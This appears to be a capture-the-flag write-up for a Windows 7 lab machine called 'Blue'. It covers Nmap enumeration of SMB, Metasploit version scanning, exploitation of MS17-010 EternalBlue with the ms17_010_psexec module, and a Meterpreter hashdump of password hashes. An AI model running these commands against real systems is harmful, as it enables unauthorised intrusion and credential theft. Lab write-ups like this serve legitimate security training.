# Blue

# Enumeration

## Nmap

[Blue_Nmap.txt](Blue_Nmap.txt)

Discover the target system run SMB service

1. 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
2. 445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)

## Metasploit

Using Metasploit to identify its Samba version (SMB 2.1)

1. msf6 > search scanner smb
2. msf6 auxiliary(scanner/smb/smb_version) > run

![image.png](image.png)

# Weaponization

1. Google Search ✅
Some resource returns it may be vulnerable to MS17-010 EternalBlue
2. Searchsploit ❌
3. Metasploit ✅
Use Metasploit to craft payload for it

# Exploitation

1. msf6 exploit(windows/smb/ms17_010_psexec) > check
    
    ![image.png](image%201.png)
    
2. msf6 exploit(windows/smb/ms17_010_psexec) > run
    
    ![image.png](image%202.png)
    

# Post-Exploitation

1. meterpreter > hashdump
    
    ![image.png](image%203.png)